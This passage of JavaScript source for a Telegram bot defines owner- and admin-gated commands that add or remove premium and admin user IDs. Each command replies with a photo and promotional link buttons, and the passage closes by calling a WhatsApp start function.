                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/dellprem(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId)) {
                           return bot.sendMessage(chatId, "[ ! ] ɴᴏᴛ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ ᴀɴᴏᴍᴀʟɪ");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[ ! ] - ᴇxᴀᴍᴘʟᴇ : /dellprem ɪᴅ - [ ʜᴜʀᴜғ ᴡᴀᴊɪʙ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ] 🐉");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (premiumUsers.includes(userId)) {
                           premiumUsers = premiumUsers.filter(id => id !== userId);
                           savePremiumUsers();
                           bot.sendPhoto(chatId, "https://c.top4top.io/p_3370ccxo01.jpg", {
                                   caption: `☬ 𝙎𝙐𝘾𝘾𝙀𝙎 𝘿𝙀𝙇 𝘼𝘿𝙈𝙄𝙉 𝙐𝙎𝙀𝙍 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!owner.includes(senderId)) {
                           return bot.sendMessage(chatId, "!!! 𝙱𝙴𝙻𝙸 𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙸 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙼𝙰𝙺𝙰𝙸 𝙽𝚈𝙰");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[𝙳𝙸𝙷𝙰𝚁𝙰𝙿 𝙼𝙴𝙼𝙰𝙺𝙰𝙸 𝙺𝙰𝙿𝙸𝚃𝙰𝙻𝙸𝚂 [𝙺𝙴𝙲𝙸𝙻] 👹");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (!/^\d+$/.test(userId)) {
                           return bot.sendMessage(chatId, "𝚂𝙴𝚁𝚃𝙰𝙺𝙰𝙽 𝙸𝙳 𝚃𝙴𝙻𝙴");
                   }
                   if (!adminUsers.includes(userId)) {
                           adminUsers.push(userId);
                           saveAdminUsers();
                           bot.sendPhoto(chatId, "https://c.top4top.io/p_3370ccxo01.jpg", {
                                   caption: `☬ 𝙎𝙐𝘾𝘾𝙀𝙎 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉 𝙐𝙎𝙀𝙍 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           bot.onText(/\/delladmin(?:\s(.+))?/, (msg, match) => {
                   const chatId = msg.chat.id;
                   const senderId = msg.from.id;
                   if (!owner.includes(senderId)) {
                           return bot.sendMessage(chatId, "!!! 𝙱𝙴𝙻𝙸 𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙸 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙼𝙰𝙺𝙰𝙸 𝙽𝚈𝙰");
                   }
                   if (!match[1]) {
                           return bot.sendMessage(chatId, "[! /delladmin=teks harus kecil semua 👹");
                   }
                   const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
                   if (adminUsers.includes(userId)) {
                           adminUsers = adminUsers.filter(id => id !== userId);
                           saveAdminUsers();
                           bot.sendPhoto(chatId, "https://b.top4top.io/p_3370v0fgp1.jpg", {
                                   caption: `☬ 𝙎𝙪𝙘𝙘𝙚𝙨 𝘿𝙚𝙡𝙡 𝘼𝙙𝙢𝙞𝙣 𝙐𝙨𝙚𝙧 🐉`,
                                   reply_markup: {
                                           inline_keyboard: [
                                                           [{
                                                                   text: "⎙「 𝙔𝙊𝙐𝙏𝙐𝘽𝙀 」⎙",
                                                                   url: "https://www.youtube.com/@aidilaseptia"
                                                           }, {
                                                                   text: "⎙「 𝙎𝘼𝙇𝙐𝙍𝘼𝙉 」⎙",
                                                                   url: "https://whatsapp.com/channel/0029Vb35JejC1FuBMPpcPd0Z"
                                                           }],
                                                           [{
                                                                   text: "⎙「 𝙎𝘾𝙍𝙄𝙋𝙏??? 」⎙",
                                                                   url: "https://t.me/Yagami4you"
                                                           }]
                                           ]
                                   }
                           });
                   }
           });
           startWhatsapp()